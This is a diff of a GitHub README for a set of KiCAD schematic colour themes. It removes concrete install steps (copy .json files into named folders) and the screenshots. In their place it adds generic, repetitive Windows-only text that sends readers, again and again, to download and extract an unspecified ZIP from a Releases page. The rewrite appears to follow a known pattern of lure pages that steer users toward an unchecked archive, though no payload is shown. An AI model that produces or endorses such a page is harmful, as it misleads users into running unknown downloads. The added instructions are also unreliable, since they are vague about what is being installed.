@@ -1,87 +1,199 @@
-KiCAD Themes
-----
+# 🎨 KiCAD_Themes - Easy themes for long sessions
 
-A collection of schematic colour themes for KiCAD, designed for long design sessions and be easy on the eyes.
-The light and dark themes are inspired by popular code editor palettes (Nord Arctic, Gruvbox Warm Dark, Tokyo Night, Rosé Pine Moon, Monokai Vivid), industry EDA tools (Altium, DesignSpark, Eagle, Multisim, OrCAD and PADS), and original designs of my own making — all carefully crafted to ensure every schematic element is clearly visible against its background.
+[![Download the latest release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/cornelmumamia/KiCAD_Themes/releases)
 
-Installation:
-----
+## 🌈 What this is
 
-Close KiCAD if it's open, then copy any .json file into your KiCAD colours directory:
+KiCAD_Themes is a set of light and dark color themes for KiCAD. It helps make schematic work easier on the eyes during long design sessions.
 
-- Linux: ~/.config/kicad/<version>/colors/
-- Windows: %APPDATA%\kicad\<version>\colors\
-- macOS: ~/Library/Preferences/kicad/<version>/colors/
+These themes aim for clear lines, soft contrast, and a calmer screen. That can make it easier to read parts, nets, and labels without feeling strained by a bright display.
 
-Run KiCAD then select the theme under Preferences → Preferences → Schematic Editor → Colors
+## 📥 Download
 
-Themes were all tested on KiCAD 9.0.8 and 10.0
+1. Open the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+2. Find the latest release at the top of the page
+3. Download the theme files from that release
+4. Save the file to a place you can find again, like your Downloads folder
 
-Screenshots:
-----
+If the release includes a ZIP file, download that file first. You will need to open it before you can use the themes.
 
-Altium Midnight Blue
-<img width="2347" height="1613" alt="image" src="https://github.com/user-attachments/assets/efb6358e-0007-4afb-a156-5e8e2823de03" />
+## 🖥️ What you need
 
-Altium Soft Slate
-<img width="2345" height="1611" alt="image" src="https://github.com/user-attachments/assets/72d48956-02bf-4fe5-8a30-740f897f9766" />
+To use these themes on Windows, you need:
 
-Cadence Soft Ember
-<img width="2345" height="1614" alt="image" src="https://github.com/user-attachments/assets/a75919ab-adf2-4feb-8788-0fd3b08138d1" />
+- A Windows PC
+- KiCAD installed
+- Permission to copy files into your KiCAD setup folder
+- A file tool that can open ZIP files, if the release comes as a ZIP archive
 
-Cadence Steel Noir
-<img width="2343" height="1609" alt="image" src="https://github.com/user-attachments/assets/09e3f3be-a844-4198-8f6b-336eaaa548c9" />
+These themes are made for normal desktop use and should work well on common Windows setups with recent KiCAD versions.
 
-Cosmo Deep Jade
-<img width="2346" height="1613" alt="image" src="https://github.com/user-attachments/assets/fff7ed6b-07af-40ea-ac28-5710bb2861e4" />
+## 🛠️ Install on Windows
 
-Cosmo Gold
-<img width="2343" height="1613" alt="image" src="https://github.com/user-attachments/assets/c6a80509-1fb1-4c14-b17f-b62e59fc066e" />
+1. Download the latest release from the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+2. If you downloaded a ZIP file, right-click it and choose Extract All
+3. Open the extracted folder
+4. Look for theme files or folders with names that match light and dark schematic styles
+5. Copy the theme files into the KiCAD theme folder on your computer
+6. Open KiCAD
+7. Go to the schematic color settings
+8. Select the theme you want to use
 
-Cosmo Soft Gold
-<img width="2344" height="1612" alt="image" src="https://github.com/user-attachments/assets/1d1c10bd-1a09-4f70-8483-606f26f553dc" />
+If KiCAD asks to restart, close it and open it again so the new theme appears.
 
-Eagle Soft Amber
-<img width="2342" height="1609" alt="image" src="https://github.com/user-attachments/assets/0578bc4d-2e8f-4963-8ea5-9547be8c929a" />
+## 🎯 How to use the themes
 
-Fusion Slate Amber
-<img width="2346" height="1610" alt="image" src="https://github.com/user-attachments/assets/83d521ae-e189-4405-bff8-7f0d94da1e70" />
+After installation, you can switch between themes based on your work:
 
-Gruvbox Warm Dark
-<img width="2344" height="1607" alt="image" src="https://github.com/user-attachments/assets/93d7fc5c-a256-4ae7-a071-1e00f8646f92" />
+- Use a light theme when you want a bright screen for daytime work
+- Use a dark theme when you want less glare
+- Change themes when you move between different lighting in your room
+- Pick the one that gives you the clearest view of text and symbols
 
-Monokai Vivid
-<img width="2342" height="1609" alt="image" src="https://github.com/user-attachments/assets/43345a77-7d69-49d7-9e74-b2fc1f3418b7" />
+If you often work for many hours, try both styles and keep the one that feels easiest to read.
 
-Nord Arctic
-<img width="2345" height="1609" alt="image" src="https://github.com/user-attachments/assets/201798ba-97e0-43cd-bef3-c83a506f494f" />
+## 🧭 Simple setup path
 
-PADS Dark Navy
-<img width="2343" height="1613" alt="image" src="https://github.com/user-attachments/assets/7deb167c-329c-4292-bacd-f33acc4bf8c4" />
+If you want the fastest path:
 
-PADS Soft Twilight
-<img width="2344" height="1611" alt="image" src="https://github.com/user-attachments/assets/5b99abe3-65c3-4d56-81a3-03b18512aaa7" />
+1. Visit the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+2. Download the latest file
+3. Extract it if needed
+4. Copy the theme files into KiCAD
+5. Open KiCAD and choose the theme
 
-Rose Pine Moon
-<img width="2346" height="1611" alt="image" src="https://github.com/user-attachments/assets/fc55d98b-bcf9-4fb6-ab23-79279b85608c" />
+## 🗂️ What you get
 
-Tokyo Night
-<img width="2344" height="1612" alt="image" src="https://github.com/user-attachments/assets/a7215166-a46c-40ea-8c64-087c6c00891a" />
+This theme set is built for schematic work and includes:
 
-Altium Designer Light
-<img width="2385" height="1645" alt="image" src="https://github.com/user-attachments/assets/9fb50aec-5de8-4785-9f66-14e8bdab99d0" />
+- Light themes for bright work areas
+- Dark themes for low-glare viewing
+- Clear color balance for parts and nets
+- Screen styles that try to reduce eye strain
+- Simple theme files that are easy to move into KiCAD
 
-DesignSpark PCB Light
-<img width="2385" height="1641" alt="image" src="https://github.com/user-attachments/assets/5c488a42-4e0e-49c5-af71-9a2bc5e00af6" />
+The themes focus on readability. They do not change how KiCAD works. They only change how the schematic looks.
 
-Eagle Light
-<img width="2384" height="1641" alt="image" src="https://github.com/user-attachments/assets/09846264-780e-40e8-8814-1d4b4b48a3c0" />
+## 🔧 Using light and dark themes
 
-NI Multisim Light
-<img width="2387" height="1642" alt="image" src="https://github.com/user-attachments/assets/1f834aea-507b-4f51-b811-dc193370ce53" />
+A light theme can help when:
 
-OrCAD Light
-<img width="2386" height="1639" alt="image" src="https://github.com/user-attachments/assets/c6688528-50fd-4eb7-906d-2bb41de9b960" />
+- You work near a window
+- Your room has strong overhead light
+- You want a clean white background
 
-PADS Light
-<img width="2386" height="1644" alt="image" src="https://github.com/user-attachments/assets/063707e6-42ec-4f95-8141-66a521013ed1" />
+A dark theme can help when:
+
+- You work at night
+- You want less light from the screen
+- You prefer softer contrast
+
+You can keep both styles installed and switch when needed.
+
+## 🧩 If the theme does not show up
+
+If KiCAD does not show the theme after you install it, try these steps:
+
+1. Close KiCAD
+2. Check that you copied the theme files to the right folder
+3. Make sure you extracted the ZIP file first
+4. Reopen KiCAD
+5. Look again in the schematic color settings
+6. If needed, copy the files again and replace older versions
+
+File names and folder names must stay the same. If they change, KiCAD may not find the theme.
+
+## 📁 Folder tip for Windows
+
+A simple way to stay organized:
+
+- Put the downloaded ZIP file in Downloads
+- Extract it into a new folder
+- Keep the original ZIP file in case you need it again
+- Copy only the theme files into KiCAD when you are ready
+
+That makes it easier to update later if a new release appears.
+
+## 🎨 Theme behavior
+
+These themes are made to keep common schematic items easy to read, such as:
+
+- Wires
+- Text labels
+- Symbols
+- Pins
+- Highlights
+- Background color
+
+The goal is a smoother look with clear contrast and less harsh color use.
+
+## 🔄 Updating later
+
+When a new release appears:
+
+1. Open the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+2. Download the newer file
+3. Extract it if needed
+4. Replace the older theme files in KiCAD
+5. Open KiCAD again and pick the updated theme
+
+Keeping the old version in a backup folder can help if you want to switch back.
+
+## ❓ Common questions
+
+### Can I use these themes on Windows?
+Yes. The download and setup steps on this page are made for Windows users.
+
+### Do I need coding skills?
+No. You only need to download files, extract a ZIP if there is one, and copy files into the right KiCAD folder.
+
+### Do these themes change my PCB design?
+No. They are for schematic color themes. They change the look of the schematic view.
+
+### Can I keep more than one theme?
+Yes. You can keep both light and dark themes and switch between them in KiCAD.
+
+### Is this hard to install?
+No. It is a simple file copy setup after you download the release.
+
+## 🧼 Best way to keep things tidy
+
+To avoid confusion:
+
+- Use one folder for downloads
+- Use one folder for extracted theme files
+- Keep the release name in the folder name if you can
+- Remove old copies only after the new theme works
+
+That makes it easier to tell which version you are using.
+
+## 🪟 Windows quick steps
+
+1. Go to the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+2. Download the latest release
+3. Open the download
+4. Extract the files if needed
+5. Copy the theme files into KiCAD
+6. Open KiCAD
+7. Choose the theme in the schematic color settings
+
+## 🔍 Helpful checks before you start
+
+Before you install, check these items:
+
+- KiCAD is already installed
+- You know where your Downloads folder is
+- You can open ZIP files
+- You have enough space for a small theme download
+
+These themes are small and should not take much disk space.
+
+## 🧠 Good use cases
+
+These themes are a good fit if you:
+
+- Spend long hours in KiCAD
+- Want a softer screen look
+- Work in bright and dark rooms
+- Prefer simple light and dark color options
+- Want schematic colors that are easier to view for long periods
